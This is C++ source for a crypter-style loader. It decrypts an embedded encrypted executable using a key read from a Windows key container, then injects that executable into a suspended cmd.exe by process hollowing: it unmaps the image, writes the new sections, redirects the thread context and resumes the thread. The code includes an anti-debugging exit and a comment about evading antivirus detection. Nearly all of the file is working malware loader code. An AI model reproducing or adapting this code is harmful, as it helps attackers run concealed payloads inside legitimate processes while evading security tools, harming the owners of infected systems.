#include "stdafx.h"
#include "HETDPFL.h"
#include "HETCrypto.h"
#include "LightCrypter.h"
#include "Resources.h"

#pragma comment(lib,"ntdll.lib")


EXTERN_C NTSTATUS NTAPI NtTerminateProcess(HANDLE, NTSTATUS);
EXTERN_C NTSTATUS NTAPI NtReadVirtualMemory(HANDLE, PVOID, PVOID, ULONG, PULONG);
EXTERN_C NTSTATUS NTAPI NtWriteVirtualMemory(HANDLE, PVOID, PVOID, ULONG, PULONG);
EXTERN_C NTSTATUS NTAPI NtGetContextThread(HANDLE, PCONTEXT);
EXTERN_C NTSTATUS NTAPI NtSetContextThread(HANDLE, PCONTEXT);
EXTERN_C NTSTATUS NTAPI NtUnmapViewOfSection(HANDLE, PVOID);
EXTERN_C NTSTATUS NTAPI NtResumeThread(HANDLE, PULONG);


void hetinternal::HETDPFL::InjectDPF(void)
{
	PIMAGE_DOS_HEADER pIDH;
	PIMAGE_NT_HEADERS pINH;
	PIMAGE_SECTION_HEADER pISH;

	PVOID image, mem, base;
	DWORD i;

	STARTUPINFO si;
	PROCESS_INFORMATION pi;
	CONTEXT ctx;

	NCRYPT_PROV_HANDLE nProv;
	
	//Acquiring LightCrypter key within windows key containers
	//Creating context
	if (NCryptOpenStorageProvider(&nProv, NULL, 0) != ERROR_SUCCESS)
	{
		return;
		exit(0);
		*((int*)NULL) = 0xBBC9;
	}

	//Getting key
	NCRYPT_KEY_HANDLE nHandle;
	if (NCryptOpenKey(nProv, &nHandle, L"HETLCK", 0, NCRYPT_SILENT_FLAG) != ERROR_SUCCESS)
	{
		return;
		exit(0);
		*((int*)NULL) = 89412;
	}
	
	//Getting lc key
	uint kkey = 0;
	DWORD pcbRes;
	if (NCryptGetProperty(nHandle, NCRYPT_KEY_USAGE_PROPERTY, (PBYTE)&kkey, sizeof(kkey), &pcbRes, NCRYPT_SILENT_FLAG) != ERROR_SUCCESS)
	{
		return;
		exit(0);
		*((int*)NULL) = 0x01520;
	}

	if (kkey == 0)
	{
		return;
		exit(0);
		*((int*)NULL) = 269423;
	}
	
	NCryptFreeObject(nHandle);
	NCryptFreeObject(nProv);

	LightCrypter* lc = new LightCrypter(kkey);

	char* hsh = new char[7]();
	for (int i = 0; i < 6; i++)
		hsh[i] = RS01[i];
	hsh[6] = '\0';

	bool hashFound = false;
	int currentI = 0;
	char* c = new char[7]();
	c[6] = '\0';
	RInit();
	//Decrypting
	for (int i = 0; i < PRG01.length(); i++)
	{
		if (currentI == 6)
		{
			currentI = 0;

			if (!hashFound)
			{
				if(strcmp(c, hsh) == 0)
				{
					hashFound = true;
					i += 58;
					lc->appendHash(RS01);
					c = new char[7]();
					c[6] = '\0';
				}
				else
				{
					lc->Decrypt(c);
					c = new char[7]();
					c[6] = '\0';
				}
			}
			else
			{
				lc->Decrypt(c);
				c = new char[7]();
				c[6] = '\0';
			}
		}

		c[currentI] = PRG01.at(i);
		currentI++;
	}

	ctx.ContextFlags = CONTEXT_FULL;

	memset(&si, 0, sizeof(si));
	memset(&pi, 0, sizeof(pi));
	
	// Start the target application
	if (!CreateProcess(L"C:\\Windows\\System32\\cmd.exe", L"dir", NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &si, &pi))
	{
		return;
		exit(0);
		*((int*)NULL) = 0xFDC4;
	}
	
	char* nnn = lc->PRG04();
	image = static_cast<void*>(nnn);
	pIDH = static_cast<PIMAGE_DOS_HEADER>(image);
	
	// Check for valid executable
	if (pIDH->e_magic != IMAGE_DOS_SIGNATURE)
	{
		// Executable is not valid, terminate the child process.
		NtTerminateProcess(pi.hProcess, 1);
		exit(0);
		*((int*)NULL) = 0x4F4;
		return;
	}

	// Get the address of the IMAGE_NT_HEADERS
	pINH = (PIMAGE_NT_HEADERS)((LPBYTE)(image) + pIDH->e_lfanew);
	
	if (IsDebuggerPresent())
	{
		exit(0);
		*((int*)NULL) = 0xAE414;
		return;
	}

	// Get the thread context of the child process's primary thread
	NtGetContextThread(pi.hThread, &ctx);
	// Get the PEB address from the ebx(Rbx) register and read the base address of the executable image from the PEB
	NtReadVirtualMemory(pi.hProcess, (PVOID)(ctx.Ebx + 8), &base, sizeof(PVOID), NULL);
	
	if ((DWORD)base == pINH->OptionalHeader.ImageBase) // If the original image has same base address as the replacement executable, unmap the original executable from the child process.
	{
		NtUnmapViewOfSection(pi.hProcess, base); // Unmap the executable image using NtUnmapViewOfSection function
	}
	
	// Allocate memory for the executable image
	//TODO: API CALL TO PREVENT AV DETECTION
	mem = VirtualAllocEx(pi.hProcess, (PVOID)pINH->OptionalHeader.ImageBase, pINH->OptionalHeader.SizeOfImage, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

	if (!mem)
	{
		// Allocation failed, terminate the child process.
		NtTerminateProcess(pi.hProcess, 1);
		exit(0);
		*((int*)NULL) = 1202524;
		return;
	}

	NtWriteVirtualMemory(pi.hProcess, mem, image, pINH->OptionalHeader.SizeOfHeaders, NULL); // Write the header of the replacement executable into child process

	for (i = 0; i<pINH->FileHeader.NumberOfSections; i++)
	{
		pISH = (PIMAGE_SECTION_HEADER)((LPBYTE)image + pIDH->e_lfanew + sizeof(IMAGE_NT_HEADERS) + (i * sizeof(IMAGE_SECTION_HEADER)));
		NtWriteVirtualMemory(pi.hProcess, (PVOID)((LPBYTE)mem + pISH->VirtualAddress), (PVOID)((LPBYTE)image + pISH->PointerToRawData), pISH->SizeOfRawData, NULL); // Write the remaining sections of the replacement executable into child process
	}

	// Set the eax(Rax) register to the entry point of the injected image
	ctx.Eax = (DWORD)((LPBYTE)mem + pINH->OptionalHeader.AddressOfEntryPoint); // Set the eax register to the entry point of the injected image

																	   // Write the base address of the injected image into the PEB
	NtWriteVirtualMemory(pi.hProcess, (PVOID)(ctx.Ebx + 8), &pINH->OptionalHeader.ImageBase, sizeof(PVOID), NULL);

	// Set the thread context of the child process's primary thread
	NtSetContextThread(pi.hThread, &ctx);
	
	// Resume the primary thread
	NtResumeThread(pi.hThread, NULL);

	// Wait for the child process to terminate
	NtWaitForSingleObject(pi.hProcess, FALSE, NULL);

	DWORD excode;
	GetExitCodeProcess(pi.hProcess, &excode);
	
	if (excode < 2000)
	{
		exit(0);
		*((int*)NULL) = excode;
		return;
	}
	else
		hetcrypto::HETCrypto::PrivateKey = excode;

	// Close the thread handle
	NtClose(pi.hThread);
	// Close the process handle
	NtClose(pi.hProcess);

	/*// Free the allocated memory
	VirtualFree(image, 0, MEM_RELEASE);*/
}
